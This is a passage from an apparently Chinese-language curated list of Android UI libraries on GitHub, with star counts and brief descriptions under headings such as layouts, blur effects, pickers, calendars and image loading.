★2297 - 视图页卡片 \n- [RecyclerViewCardGallery](https://github.com/huazhiyuan2008/RecyclerViewCardGallery) ★1443 - RecyclerView实现Card Gallery效果 \n- [Swipeable-Cards](https://github.com/kikoso/Swipeable-Cards) ★1375 - 提供类似Tinder卡片效果 \n- [SwipeStack](https://github.com/flschweiger/SwipeStack) ★1142 - 安卓纸质视图栈 \n- [SwipeCardView](https://github.com/xiepeijie/SwipeCardView) ★1027 - 基于Diolor的Swipecards控件改进实现 \n- [CardStackView](https://github.com/loopeer/CardStackView) ★962 - 以三种动画效果像卡片一样展示内容 \n- [NineGridView](https://github.com/jeasonlzy/NineGridView) ★886 - 展示图片的九宫格控件 \n- [Android-InfiniteCards](https://github.com/BakerJQ/Android-InfiniteCards) ★669 - 可自定义动效的卡片切换视图 \n- [SlidingCard](https://github.com/mxn21/SlidingCard) ★623 - 画廊效果的幻灯片卡片 \n- [GiftCard](https://github.com/ldoublem/GiftCard) ★580 - Android漂亮的礼物卡片 \n- [AndroidSwipeableCardStack](https://github.com/wenchaojiang/AndroidSwipeableCardStack) ★563 - 流畅的纸质卡片组件 \n- [TinderStack](https://github.com/lawloretienne/TinderStack) ★536 - 一叠类似Tinder的卡片 \n- [SwipeCardsView](https://github.com/huxq17/SwipeCardsView) ★370 - Android高仿秒拍热榜的卡片滑动和左右飞出效果 \n- [CardView](https://github.com/vivian8725118/CardView) ★220 - 类似小票效果的卡片列表 \n- [CardSwipeLayout](https://github.com/yuqirong/CardSwipeLayout) ★199 - RecyclerView卡片滑动布局 \n- [StackCardsView](https://github.com/wensefu/StackCardsView) ★50 - 堆叠滑动控件 \n- [turncardlistview](https://github.com/czy1121/turncardlistview) ★33 - 上下翻页的卡片列表 \n- [SwipeCardsRecyclerView](https://github.com/yuyuyu123/SwipeCardsRecyclerView) ★22 - 基于RecyclerView的Android组件 \n\n## Color \n\n- [InstagramLikeColorTransitionAndroid](https://github.com/Taishi-Y/InstagramLikeColorTransitionAndroid) ★367 - 创建类似渐变颜色过渡的Instagram \n- [ColorPickerView](https://github.com/skydoves/ColorPickerView) ★290 - 从图片中获取颜色 \n- [MaterialDesignColor](https://github.com/zzhoujay/MaterialDesignColor) ★281 - 谷歌官方MaterialDesign颜色代码 \n- [colorpreference](https://github.com/kizitonwose/colorpreference) ★209 - 建立优秀的颜色选择器 \n- [DrawableColorChange](https://github.com/mathiazhagan01/DrawableColorChange) ★85 - drawable颜色修改工具 \n- [ColorPicker](https://github.com/DingMouRen/ColorPicker) ★79 - android取色器 \n- [MaterialDesignColors](https://github.com/bassaer/MaterialDesignColors) ★55 - 提供MD风格的Android库 \n\n## Drawable \n\n- [DividerDrawable](https://github.com/nekocode/DividerDrawable) ★376 - 在存在的View上布局和画分割线 \n- [OneDrawable](https://github.com/maoruibin/OneDrawable) ★215 - 为View设置具有按下效果的背景 \n- [SelectorDrawable](https://github.com/yuanwenbing/SelectorDrawable) ★26 - 为按钮设置selector \n\n## Spinner \n\n- [nice-spinner](https://github.com/arcadefire/nice-spinner) ★1015 - Android spinner的重新实现 \n- [BetterSpinner](https://github.com/Lesilva/BetterSpinner) ★544 - 好用的Spinner \n- [MemorySpinner](https://github.com/Jasonchenlijian/MemorySpinner) ★129 - 可以记住历史选项的spinner \n\n## 布局 \n\n- [flexbox-layout](https://github.com/google/flexbox-layout) ★8115 - Android盒式布局功能库 \n- [AndroidAutoLayout](https://github.com/hongyangAndroid/AndroidAutoLayout) ★5164 - Android屏幕适配方案 \n- [vlayout](https://github.com/alibaba/vlayout) ★4665 - 布局方案和布局间的组件复用 \n- [FlowLayout](https://github.com/hongyangAndroid/FlowLayout) ★2390 - Android流式布局 \n- [DiagonalLayout](https://github.com/florent37/DiagonalLayout) ★1860 - MD风格的新的样式和方法 \n- [FanLayoutManager](https://github.com/Cleveroad/FanLayoutManager) ★1477 - 扇形水平列表视图 \n- [smooth-app-bar-layout](https://github.com/henrytao-me/smooth-app-bar-layout) ★1434 - 视图布局 \n- [FlexLayout](https://github.com/mmin18/FlexLayout) ★1377 - 强大的Android布局视图 \n- [FlowLayoutManager](https://github.com/mcxtzhang/FlowLayoutManager) ★1152 - 利用自定义LayoutManager 的一些实战实例 \n- [TextLayoutBuilder](https://github.com/facebookincubator/TextLayoutBuilder) ★1124 - Facebook出品的在Android中轻松实现文字布局 \n- [ExpandableLayout](https://github.com/AAkira/ExpandableLayout) ★1041 - 带有各种动画的扩展布局 \n- [FlowLayout](https://github.com/nex3z/FlowLayout) ★952 - 让子视图自动浮动到下一行 \n- [ArcLayout](https://github.com/florent37/ArcLayout) ★864 - 使用ArcLayout探索新的MD风格的样式和方法 \n- [ExpandableLayout](https://github.com/cachapa/ExpandableLayout) ★818 - 实现动画扩展和子视图折叠 \n- [FlowTag](https://github.com/hanhailong/FlowTag) ★579 - Android流式布局 \n- [ExpandableLayout](https://github.com/SilenceDut/ExpandableLayout) ★414 - 节省空间的可扩展布局 \n- [HiveLayoutManager](https://github.com/Chacojack/HiveLayoutManager) ★373 - 蜂巢布局管理器 \n- [ThreeDLayout](https://github.com/githubwing/ThreeDLayout) ★366 - 让任何view拥有3D效果 \n- [ILayoutAnimationController](https://github.com/HuanHaiLiuXin/ILayoutAnimationController) ★256 - 一行代码搞定布局动画 \n- [StickyNavLayout](https://github.com/ta893115871/StickyNavLayout) ★254 - 悬浮控件 \n- [LiveLayout](https://github.com/Qiang3570/LiveLayout) ★227 - 关于直播布局与礼物特效的Demo \n- [RippleLayout](https://github.com/liuguangqiang/RippleLayout) ★208 - 实现波纹效果的布局 \n- [AssembleEssay](https://github.com/rantianhua/AssembleEssay) ★75 - 自定义LayoutManager实现流动布局 \n- [FlowLayoutDemo](https://github.com/PingerOne/FlowLayoutDemo) ★23 - 自定义View实现流式布局 \n- [LikeELMLeftLoad](https://github.com/CSnowStack/LikeELMLeftLoad) ★17 - 仿饿了么左滑跳转 \n\n## 模糊效果 \n\n- [Android StackBlur](https://github.com/kikoso/android-stackblur) ★2784 - 图片模糊效果 \n- [Blurry](https://github.com/wasabeef/Blurry) ★2624 - Android简易模糊库 \n- [blurkit-android](https://github.com/wonderkiln/blurkit-android) ★1992 - 类似iOS上的实时模糊效果 \n- [500px-android-blur](https://github.com/500px/500px-android-blur) ★1966 - Android模糊视图 \n- [BlurView](https://github.com/Dimezis/BlurView) ★1652 - Android底层视图动态仿iOS模糊 \n- [ImageBlurring](https://github.com/qiujuer/ImageBlurring) ★1104 - 通过 Java 与 JNI 分别进行图片模糊 \n- [RealtimeBlurView](https://github.com/mmin18/RealtimeBlurView) ★938 - 仿UIVisualEffectView实时模糊覆盖 \n- [BlurredView](https://github.com/wl9739/BlurredView) ★857 - Android图片视图动态模糊 \n- [BlurLockView](https://github.com/Nightonke/BlurLockView) ★857 - 毛玻璃效果的解锁界面 \n- [Dali](https://github.com/patrickfav/Dali) ★787 - Android图像模糊库 \n- [RxBlur](https://github.com/SmartDengg/RxBlur) ★519 - 毛玻璃（高斯模糊）效果 \n- [EtsyBlur](https://github.com/Manabu-GT/EtsyBlur) ★514 - 在Etsy应用添加仿玻璃模糊效果 \n- [GaussianBlur](https://github.com/jrvansuita/GaussianBlur) ★306 - 对图片应用高斯模糊 \n- [CrazyShadow](https://github.com/Hitomis/CrazyShadow) ★226 - 为 View 添加阴影效果 \n\n## TabBar \n\n- [SpaceTabLayout](https://github.com/thelong1EU/SpaceTabLayout) ★1002 - RelativeLayout的自定义实现方式 \n- [RecyclerTabLayout](https://github.com/nshmura/RecyclerTabLayout) ★883 - 高效TabLayout库 \n- [ZuiMeiTAG](https://github.com/huage2580/ZuiMeiTAG) ★242 - 仿最美应用的底栏 \n- [AlphaIndicatorView](https://github.com/jeasonlzy/AlphaIndicatorView) ★218 - 仿微信底部tab标签 \n\n## AppBar \n\n- [smooth-app-bar-layout](https://github.com/henrytao-me/smooth-app-bar-layout) ★1434 - 视图布局 \n- [appbarlayout-spring-behavior](https://github.com/ToDou/appbarlayout-spring-behavior) ★756 - 实现滚动弹簧效果 \n- [TestAppBar](https://github.com/SpikeKing/TestAppBar) ★272 - AppBar动画效果 \n- [simple-view-behavior](https://github.com/zoonooz/simple-view-behavior) ★255 - 简单视图行为 \n\n## 选择器(Picker) \n\n- [Android-PickerView](https://github.com/saiwu-bigkoo/Android-PickerView) ★4321 - 精仿iOS的PickerView控件 \n- [android-betterpickers](https://github.com/code-troopers/android-betterpickers) ★2488 - 选择器DialogFragments库 \n- [AndroidPicker](https://github.com/gzu-liyujiang/AndroidPicker) ★2207 - 安卓选择器类库 \n- [SublimePicker](https://github.com/vikramkakkar/SublimePicker) ★1795 - 提供选择器的自定义视图 \n- [Android-FilePicker](https://github.com/DroidNinja/Android-FilePicker) ★1103 - 灵活选择图片和视频的文件选择器 \n- [TimePickerDialog](https://github.com/JZXiang/TimePickerDialog) ★1031 - Android时间选择器 \n- [CityPicker](https://github.com/zaaach/CityPicker) ★955 - 仿美团等选择城市列表demo \n- [BottomSheetPickers](https://github.com/philliphsu/BottomSheetPickers) ★843 - ndroid的新的数据和时间选择器库 \n- [PickView](https://github.com/brucetoo/PickView) ★814 - 选择日期或者省份的辅助库 \n- [MultiType-FilePicker](https://github.com/fishwjy/MultiType-FilePicker) ★769 - 轻量级Android文件选择库 \n- [NumberPickerView](https://github.com/Carbs0126/NumberPickerView) ★652 - 灵活的安卓NumberPicker组件 \n- [android-spinnerwheel](https://github.com/ai212983/android-spinnerwheel) ★627 - 安卓轮式旋转部件 \n- [CharacterPickerView](https://github.com/ImKarl/CharacterPickerView) ★626 - 仿iOS的PickerView控件 \n- [CarouselPicker](https://github.com/GoodieBag/CarouselPicker) ★475 - 轮播图选择器 \n- [android-pickers](https://github.com/addappcn/android-pickers) ★303 - 安卓选择器类库 \n- [HorizontalPicker](https://github.com/GoodieBag/HorizontalPicker) ★300 - 支持文本和图标的水平选择器 \n- [SingleDateAndTimePicker](https://github.com/florent37/SingleDateAndTimePicker) ★294 - 在一个部件内选择一个数据和一个时间 \n- [Two-Step-Picker-Dialog](https://github.com/aliab/Two-Step-Picker-Dialog) ★241 - 两步选择器对话框 \n- [EasyPickerView](https://github.com/huzenan/EasyPickerView) ★194 - Android轻量级PickerView \n- [LFilePicker](https://github.com/leonHua/LFilePicker) ★178 - 轻量级的文件选择器 \n- [SimpleNumberPicker](https://github.com/StephaneBg/SimpleNumberPicker) ★157 - 十进制和十六进制选择器视图 \n- [HorizontalPicker](https://github.com/adityagohad/HorizontalPicker) ★131 - 一个简单的自定义的和容易使用的的picker \n- [AwesomeImagePicker](https://github.com/myinnos/AwesomeImagePicker) ★123 - 使用精致的接口选择images和gifs \n- [PickTime](https://github.com/codbking/PickTime) ★118 - 日期选择控件 \n- [PickImage](https://github.com/jrvansuita/PickImage) ★95 - 带有Camera和Gallery选项的DialogFragment \n- [ClickNumberPicker](https://github.com/polok/ClickNumberPicker) ★79 - 从给定范围内使用点击按钮或者触摸选定一个值 \n- [Android-PickerView-Library](https://github.com/Airsaid/Android-PickerView-Library) ★78 - 高仿 IOS PickerView 控件的库 \n- [JDSelector](https://github.com/dunwen/JDSelector) ★75 - 仿京东的地址多级选择器 \n- [NumberPicker](https://github.com/BorealisAgency/NumberPicker) ★41 - Android数字选择器视图 \n- [CityPickerWebView](https://github.com/limxing/CityPickerWebView) ★38 - JS实现的省市县三级联动 \n- [PhotoPicker](https://github.com/yudu233/PhotoPicker) ★24 - Android 照片选择器 \n- [CityPicker](https://github.com/yuruizhe/CityPicker) ★20 - 一个仿大众点评的城市快速选择器 \n\n## 跑马灯 \n\n- [MarqueeView](https://github.com/sfsheng0322/MarqueeView) ★1635 - 垂直翻页公告 \n- [MarqueeViewDemo](https://github.com/gongwen/MarqueeViewDemo) ★951 - 跑马灯View \n- [MarqueeLayoutLibrary](https://github.com/oubowu/MarqueeLayoutLibrary) ★395 - 支持四个方向循环滚动的自定义控件 \n- [noticeview](https://github.com/czy1121/noticeview) ★257 - 滚动播放的公告控件 \n- [VerticalBannerView](https://github.com/guojunustb/VerticalBannerView) ★211 - 安卓自定义控件 \n- [AdvancedTextSwitcher](https://github.com/SumiMakito/AdvancedTextSwitcher) ★199 - 卡片上滚动显示最新评论 \n- [VerticalMarqueeView](https://github.com/chenpengfei88/VerticalMarqueeView) ★13 - 新闻向上不断滚动跑马灯效果 \n\n## 日历时间 \n\n- [android-times-square](https://github.com/square/android-times-square) ★3764 - 从日历视图选择一个单独日期 \n- [material-calendarview](https://github.com/prolificinteractive/material-calendarview) ★2944 - MD风格的日历视图 \n- [MaterialDateTimePicker](https://github.com/wdullaer/MaterialDateTimePicker) ★2540 - MD风格日期时间选择器 \n- [Android-Week-View](https://github.com/alamkanak/Android-Week-View) ★2390 - 在Android应用中显示日历 \n- [CountdownView](https://github.com/iwgang/CountdownView) ★1327 - 安卓倒计时控件 \n- [Caldroid](https://github.com/roomorama/Caldroid) ★1289 - 以月为单位的日历控件 \n- [TimePickerDialog](https://github.com/JZXiang/TimePickerDialog) ★1031 - Android时间选择器 \n- [CompactCalendarView](https://github.com/SundeepK/CompactCalendarView) ★967 - 简单的日历视图 \n- [AgendaCalendarView](https://github.com/Tibolte/AgendaCalendarView) ★944 - 仿Outloo和Google日历 \n- [MaterialDateRangePicker](https://github.com/borax12/MaterialDateRangePicker) ★860 - 日期选择控件库 \n- [BottomSheetPickers](https://github.com/philliphsu/BottomSheetPickers) ★843 - ndroid的新的数据和时间选择器库 \n- [CalendarListView](https://github.com/Kelin-Hong/CalendarListView) ★766 - 可互动的ListView+CalendarView \n- [WeekCalendar](https://github.com/nomanr/WeekCalendar) ★564 - 提供星期日历的库 \n- [HorizontalCalendar](https://github.com/Mulham-Raee/HorizontalCalendar) ★527 - MD风格的水平日历视图 \n- [CalendarExaple](https://github.com/codbking/CalendarExaple) ★503 - 高仿钉钉和小米的日历控件 \n- [EasyCalendar](https://github.com/shichaohui/EasyCalendar) ★379 - 快捷自定义日历UI \n- [android-calendar-view](https://github.com/myjoybar/android-calendar-view) ★332 - 易扩展的andorid日历控件库 \n- [Cadar](https://github.com/memfis19/Cadar) ★314 - 可以显示事件的日历视图 \n- [TimerView](https://github.com/fashare2015/TimerView) ★314 - 解耦良好的计时控件 \n- [SingleDateAndTimePicker](https://github.com/florent37/SingleDateAndTimePicker) ★294 - 在一个部件内选择一个数据和一个时间 \n- [CalendarView](https://github.com/henry-newbie/CalendarView) ★211 - 高度定制的日期选择器 \n- [MiClockView](https://github.com/MonkeyMushroom/MiClockView) ★194 - 高仿小米时钟 \n- [MaterialCalendar](https://github.com/jMavarez/MaterialCalendar) ★171 - 一个MD风格的日历 \n- [GregorianLunarCalendar](https://github.com/Carbs0126/GregorianLunarCalendar) ★160 - 农历+公历的日期选择模式 \n- [CalendarView](https://github.com/mahendramahi/CalendarView) ★130 - 简单的自定义日历视图 \n- [CalendarView](https://github.com/huanghaibin-dev/CalendarView) ★117 - 优雅且性能高效的日历控件 \n- [GAHonorClock](https://github.com/Ajian-studio/GAHonorClock) ★117 - 时钟动画 \n- [MNCalendar](https://github.com/maning0303/MNCalendar) ★100 - 一个简单的日历控件 \n- [Android-SwitchDateTimePicker](https://github.com/Kunzisoft/Android-SwitchDateTimePicker) ★97 - 日期时间选择器库 \n- [week-month-Calendar](https://github.com/afinal/week-month-Calendar) ★75 - 周月切换的日历 \n- [RetainedDateTimePickers](https://github.com/k0shk0sh/RetainedDateTimePickers) ★68 - 在手机方向改变时保持日期时间选择器 \n- [WeekViewSwipeable](https://github.com/Yuncun/WeekViewSwipeable) ★62 - 以周格式显示数据的Android视图 \n- [DateRangePicker](https://github.com/MedAmineTazarki/DateRangePicker) ★50 - 带数据选择器的Dialogo fragment \n- [TimelyView](https://github.com/iballan/TimelyView) ★42 - 时间动画视图 \n- [NubiaTimer](https://github.com/jiefly/NubiaTimer) ★36 - 高仿Nubia 定时器的自定义view \n- [Android-CalendarView-master](https://github.com/wenzhihao123/Android-CalendarView-master) ★30 - Android自定义日历日期选择控件\n\n## 主题样式 \n\n- [MagicaSakura](https://github.com/Bilibili/MagicaSakura) ★1931 - Android多主题库 \n- [Android-skin-support](https://github.com/ximsfei/Android-skin-support) ★1619 - 用心的Android 换肤框架 \n- [Colorful](https://github.com/garretyoder/Colorful) ★1523 - 轻松改变app的配色方案 \n- [aesthetic](https://github.com/afollestad/aesthetic) ★994 - 一个快速容易的即插即用的动态主题引擎 \n- [Scoops](https://github.com/52inc/Scoops) ★686 - 动态改变应用主题 \n- [ThemeDemo](https://github.com/zzz40500/ThemeDemo) ★386 - 日夜间模式切换 \n- [ThemeSkinning](https://github.com/burgessjp/ThemeSkinning) ★273 - Android 主题换肤的开源库 \n- [Blackbulb](https://github.com/fython/Blackbulb) ★158 - MD风格的夜间屏幕Android 应用 \n- [AndroidSkinAnimator](https://github.com/wutongke/AndroidSkinAnimator) ★150 - 仿网易云音乐换肤框架 \n- [ChangeMode](https://github.com/zhangke3016/ChangeMode) ★69 - Android动态切换夜间模式的实现库 \n- [QSkinLoader](https://github.com/qqliu10u/QSkinLoader) ★37 - QSkinLoader换肤框架 \n\n## ImageView \n\n- [RoundedImageView](https://github.com/vinc3m1/RoundedImageView) ★3976 - 支持圆角的快速ImageView。 \n- [subsampling-scale-image-view](https://github.com/davemorrissey/subsampling-scale-image-view) ★2964 - 安卓自定义图片视图 \n- [PanoramaImageView](https://github.com/gjiazhe/PanoramaImageView) ★1526 - 可以随设备旋转自动滚动的imageView \n- [CustomShapeImageView](https://github.com/MostafaGazar/CustomShapeImageView) ★1412 - 自定义使用SVG和填充图的ImageView \n- [FrescoImageViewer](https://github.com/stfalcon-studio/FrescoImageViewer) ★1159 - 简单的自定义全屏图片视图 \n- [LargeImage](https://github.com/LuckyJayce/LargeImage) ★1067 - Android加载大图 \n- [ShadowImageView](https://github.com/yingLanNull/ShadowImageView) ★965 - 更加细腻的阴影效果 \n- [Crescento](https://github.com/developer-shivam/Crescento) ★902 - 图像视图和相关布局的下面添加曲线 \n- [CircularImageView](https://github.com/lopspower/CircularImageView) ★895 - 以简单的方法实现环形ImageView \n- [NineGridImageView](https://github.com/laobie/NineGridImageView) ★876 - 仿微信朋友圈或微博的九宫格图片 \n- [DragPhotoView](https://github.com/githubwing/DragPhotoView) ★871 - 高仿微信可拖拽返回PhotoView \n- [ImageTransition](https://github.com/vikramkakkar/ImageTransition) ★561 - Activity视图过渡 \n- [CaptchaImageView](https://github.com/jineshfrancs/CaptchaImageView) ★504 - 生成验证码图片的自定义ImageView \n- [android-combination-avatar](https://github.com/kongnanlive/android-combination-avatar) ★503 - 模仿QQ讨论组组合头像 \n- [Oblique](https://github.com/akshay2211/Oblique) ★414 - 探索新的显示图片样式 \n- [PaletteImageView](https://github.com/DingMouRen/PaletteImageView) ★404 - 动态提取图片的主要颜色 \n- [ScrollParallaxImageView](https://github.com/gjiazhe/ScrollParallaxImageView) ★402 - 滚动视差效果 \n- [Frisson](https://github.com/IntruderShanky/Frisson) ★320 - 在图片上提供时髦的剪裁 \n- [Diagonalify](https://github.com/developer-shivam/Diagonalify) ★283 - 创建图像视图的对角线切割 \n- [avatar-view](https://github.com/TangoAgency/avatar-view) ★208 - 带有用户名字的第一个字母的图片视图 \n- [AnchorImageView](https://github.com/jcodeing/AnchorImageView) ★197 - Android锚点定位ImageView \n- [CircleImageView](https://github.com/zuoweitan/CircleImageView) ★167 - 环形ImageView \n- [Wiv](https://github.com/ihsanbal/Wiv) ★160 - 窗口图片显示器 \n- [IdentityImageView](https://github.com/385841539/IdentityImageView) ★135 - 带进度条的图片框架 \n- [SImageView](https://github.com/suzeyu1992/SImageView) ★121 - 设置一个网址即可显示图片的控件 \n- [LQRNineGridImageView](https://github.com/GitLqr/LQRNineGridImageView) ★51 - 仿微信群头像九宫格控件 \n- [CoolImageView](https://github.com/HuTianQi/CoolImageView) ★51 - 可以上下移动的imageView \n- [Blaze](https://github.com/IntruderShanky/Blaze) ★41 - 提供移动图像和缩放图像的视图 \n- [HDImageView](https://github.com/EvilBT/HDImageView) ★34 - 加载高清大图支持缩放的控件 \n- [GridImageView](https://github.com/A-W-C-J/GridImageView) ★21 - 根据图片数量自动适配加载 \n- [RoundImageView](https://github.com/gslovemy/RoundImageView) ★13 - Android自定义圆角图片 \n\n## 通知 \n\n- [Alerter](https://github.com/Tapadoo/Alerter) ★2816 - 克服Toast和Snackbar的限制 \n- [NotifyUtil](https://github.com/wenmingvs/NotifyUtil) ★947 - 高仿淘宝微信等热门APP通知视图 \n- [Pugnotification](https://github.com/halysongoncalves/Pugnotification) ★691 - 通过一行代码实现通知功能 \n- [NotifyUtil](https://github.com/hss01248/NotifyUtil) ★140 - notification工具类 \n- [Carousel-Notification](https://github.com/shaileshmamgain5/Carousel-Notification) ★78 - 轮播框通知 \n- [NotificationUtil](https://github.com/linglongxin24/NotificationUtil) ★44 - 全新的Android通知栏 \n\n## 聊天视图 \n\n- [aurora-imui](https://github.com/jpush/aurora-imui) ★1703 - 通用的即时通讯UI 库 \n- [ChatKit](https://github.com/stfalcon-studio/ChatKit) ★1032 - 简化UI开发 \n- [ChatMessageView](https://github.com/himanshu-soni/ChatMessageView) ★559 - 快速创建聊天信息视图 \n- [ChatMessageView](https://github.com/bassaer/ChatMessageView) ★268 - Android聊天UI视图 \n- [ChatDemo](https://github.com/Maxi-Mao/ChatDemo) ★129 - 实现聊天界面 \n\n## Header \n\n- [StickyHeaderListView](https://github.com/sfsheng0322/StickyHeaderListView) ★1899 - 基于实际需求做出的灵活可定制的UI功能 \n- [ZoomHeader](https://github.com/githubwing/ZoomHeader) ★1797 - 模仿饿了么详情页的例子 \n- [Android-ParallaxHeaderViewPager](https://github.com/kmshack/Android-ParallaxHeaderViewPager) ★1307 - 带标题头的左右滑动 \n- [StickyHeaders](https://github.com/ShamylZakariya/StickyHeaders) ★784 - 安卓RecyclerView的适配器和布局管理器 \n- [RecyclerViewWithHeaderNewPractice](https://github.com/drakeet/RecyclerViewWithHeaderNewPractice) ★537 - 结合HeaderView的RecyclerView新实现 \n- [StickyNavLayout](https://github.com/ta893115871/StickyNavLayout) ★254 - 悬浮控件 \n- [Smart-HeaderFooter-RecyclerView](https://github.com/songhanghang/Smart-HeaderFooter-RecyclerView) ★214 - 将Recyclerview添加HeaderView和FooterView \n\n## 引导图(Intro) \n\n- [AppIntro](https://github.com/PaoloRotolo/AppIntro) ★6281 - 制作一个很酷的app介绍页 \n- [ShowcaseView](https://github.com/amlcurran/ShowcaseView) ★4788 - 向用户突出app的特定部分 \n- [WoWoViewPager](https://github.com/Nightonke/WoWoViewPager) ★1949 - 优化App介绍/引导页面 \n- [material-intro-screen](https://github.com/TangoAgency/material-intro-screen) ★1882 - MD风格的介绍页面 \n- [GuideView](https://github.com/binIoter/GuideView) ★1724 - 创建遮罩式导航页 \n- [Onboarding](https://github.com/eoinfogarty/Onboarding) ★1402 - 以一种漂亮的方式向用户介绍应用 \n- [paper-onboarding-android](https://github.com/Ramotion/paper-onboarding-android) ★1340 - MD风格的onboarding \n- [MaterialIntroTutorial](https://github.com/riggaroo/MaterialIntroTutorial) ★769 - MD风格介绍导航 \n- [FancyShowCaseView](https://github.com/faruktoptas/FancyShowCaseView) ★740 - 易于使用的自定义显示案例视图 \n- [ahoy-onboarding](https://github.com/codemybrainsout/ahoy-onboarding) ★528 - 可自定义背景的引导页面 \n- [HighLightGuideView](https://github.com/jaydenxiao2016/HighLightGuideView) ★359 - 用于 app 新功能高亮引导的库 \n- [Material-ViewPagerIndicator](https://github.com/ronaldsmartin/Material-ViewPagerIndicator) ★338 - 超级简单的页面指示器 \n- [Vertical-Intro](https://github.com/armcha/Vertical-Intro) ★243 - 在你的应用程序中整合material vertical \n- [UserGuideView](https://github.com/yilylong/UserGuideView) ★205 - 用户指引view \n- [Material-Onboarding](https://github.com/Vexigon/Material-Onboarding) ★182 - 轻松实现引导图 \n- [StepDialog](https://github.com/guangzq/StepDialog) ★125 - ofo应用首次注册时的步骤控件 \n- [SlidingIntoView](https://github.com/ihsanbal/SlidingIntoView) ★64 - 简单的滑动介绍视图 \n\n## 图片 \n\n- [glide](https://github.com/bumptech/glide) ★15851 - 媒体管理和图片加载框架 \n- [Android-Universal-Image-Loader](https://github.com/nostra13/Android-Universal-Image-Loader) ★15309 - 异步图像加载程序 \n- [picasso](https://github.com/square/picasso) ★13542 - 安卓图片缓存库 \n- [fresco](https://github.com/facebook/fresco) ★12823 - 在Android应用中显示图片 \n- [PhotoView](https://github.com/chrisbanes/PhotoView) ★10275 - 简单可用的放大安卓ImageView实现 \n- [CircleImageView](https://github.com/hdodenhof/CircleImageView) ★7172 - 圆形介绍头像 \n- [uCrop](https://github.com/Yalantis/uCrop) ★5243 - 极限且灵活的图像裁剪体验 \n- [glide-transformations](https://github.com/wasabeef/glide-transformations) ★3803 - 图像转换类库 \n- [android-crop](https://github.com/jdamcd/android-crop) ★3602 - 简单的图片裁剪功能的Android库项目 \n- [Matisse](https://github.com/zhihu/Matisse) ★3015 - Android本地图像选择器 \n- [TakePhoto](https://github.com/crazycodeboy/TakePhoto) ★2896 - Android设备上获取裁剪压缩图片 \n- [Android-Image-Cropper](https://github.com/ArthurHub/Android-Image-Cropper) ★2362 - Android图片裁剪库 \n- [MultiImageSelector](https://github.com/lovetuzitong/MultiImageSelector) ★2325 - 仿微信实现多图选择 \n- [PhotoPicker](https://github.com/donglua/PhotoPicker) ★1905 - 仿Wechat图片选择器 \n- [boxing](https://github.com/Bilibili/boxing) ★1772 - 基于MVP模式的Android多媒体选择器 \n- [KenBurnsView](https://github.com/flavioarfaria/KenBurnsView) ★1761 - 身临其境的动画拖拽 \n- [ImagePicker](https://github.com/jeasonlzy/ImagePicker) ★1696 - Android仿微信UI自定义相册 \n- [BigImageViewer](https://github.com/Piasy/BigImageViewer) ★1664 - 支持平移和缩放的大图像缩放器 \n- [scissors](https://github.com/lyft/scissors) ★1650 - Android图片裁剪库 \n- [AndroidPhotoFilters](https://github.com/Zomato/AndroidPhotoFilters) ★1644 - 快速强大灵活的图片处理器 \n- [SimpleCropView](https://github.com/IsseiAoki/SimpleCropView) ★1640 - Android图片裁剪库 \n- [PictureSelector](https://github.com/LuckSiege/PictureSelector) ★1537 - 多图选择上传 \n- [ImageViewZoom](https://github.com/sephiroth74/ImageViewZoom) ★1489 - 支持超大图片流畅缩放 \n- [cropiwa](https://github.com/steelkiwi/cropiwa) ★1363 - 实现图片剪裁的多配置部件 \n- [Tiny](https://github.com/Sunzxyong/Tiny) ★1307 - 图像压缩框架 \n- [PhotoView](https://github.com/bm-x/PhotoView) ★1296 - 图片浏览缩放控件 \n- [RxGalleryFinal](https://github.com/FinalTeam/RxGalleryFinal) ★1115 - android图片/视频文件选择器 \n- [BlurImageView](https://github.com/wingjay/BlurImageView) ★1086 - 逐步加载图像 \n- [TransferImage](https://github.com/Hitomis/TransferImage) ★1051 - 仿qq 点击缩略图后预览高清图 \n- [TelegramGallery](https://github.com/TangXiaoLv/TelegramGallery) ★1044 - 快速高效低耗相册选择器 \n- [android-square-progressbar](https://github.com/mrwonderman/android-square-progressbar) ★976 - 围绕图片的进度条 \n- [EasyImage](https://github.com/jkwiecien/EasyImage) ★912 - 从gallery，相机或者文件中获取图片 \n- [PinchImageView](https://github.com/boycy815/PinchImageView) ★906 - 安卓图片手势控件 \n- [NineGridView](https://github.com/jeasonlzy/NineGridView) ★886 - 展示图片的九宫格控件 \n- [AdvancedLuban](https://github.com/shaohui10086/AdvancedLuban) ★861 - 方便简约的 Android 图片压缩工具库 \n- [album](https://github.com/yanzhenjie/album) ★857 - Android轻量级相册 \n- [PhotoEditDemo](https://github.com/jarlen/PhotoEditDemo) ★828 - 图片处理sdk \n- [SimpleTagImageView](https://github.com/wujingchao/SimpleTagImageView) ★822 - 安卓中带有标签的ImageView \n- [BGAPhotoPicker-Android](https://github.com/bingoogolapple/BGAPhotoPicker-Android) ★771 - Android图片选择 \n- [StyleImageView](https://github.com/chengdazhi/StyleImageView) ★724 - 图片相关视图的风格添加及亮度对比度设置 \n- [ImageEditor-Android](https://github.com/siwangqishiq/ImageEditor-Android) ★688 - 编辑图片 \n- [ImagePicker](https://github.com/martin90s/ImagePicker) ★687 - 图片选择控件 \n- [image-chooser-library](https://github.com/coomar2841/image-chooser-library) ★660 - 以很少的代码捕获图片/视频 \n- [Zoomy](https://github.com/imablanco/Zoomy) ★648 - 缩放Android库 \n- [CropImageView](https://github.com/cesards/CropImageView) ★588 - 支持不同类型裁剪的ImageView \n- [ImageGallery](https://github.com/lawloretienne/ImageGallery) ★555 - 用于放置图像数组的gallery \n- [ImageSelector](https://github.com/smuyyh/ImageSelector) ★554 - Android图片选择器 \n- [DragScaleCircleView](https://github.com/hpfs0/DragScaleCircleView) ★485 - 能够拖拽和缩放及裁剪图片的环形窗口 \n- [wqgallery](https://github.com/wqandroid/wqgallery) ★387 - 微信样式相册选择器 \n- [AvatarImageView](https://github.com/Carbs0126/AvatarImageView) ★376 - 电话本联系人头像 \n- [RapidInterpolator](https://github.com/MartinRGB/RapidInterpolator) ★371 - 动态调整interpolator的Java库 \n- [Louvre](https://github.com/andremion/Louvre) ★361 - 自定义图片选择器 \n- [MediaPickerInstagram](https://github.com/NodensN/MediaPickerInstagram) ★344 - 仿Instagram的MediaPicker \n- [IPicker](https://github.com/liuguangqiang/IPicker) ★304 - Material Design 风格的图片选择器 \n- [RxPicker](https://github.com/imuhao/RxPicker) ★296 - 基于RxJava的Android图片选择器. \n- [InstaCropper](https://github.com/yasharpm/InstaCropper) ★294 - 仿Instagram图片裁剪 \n- [PickPhotoSample](https://github.com/Werb/PickPhotoSample) ★277 - 帮助你选择图片的库 \n- 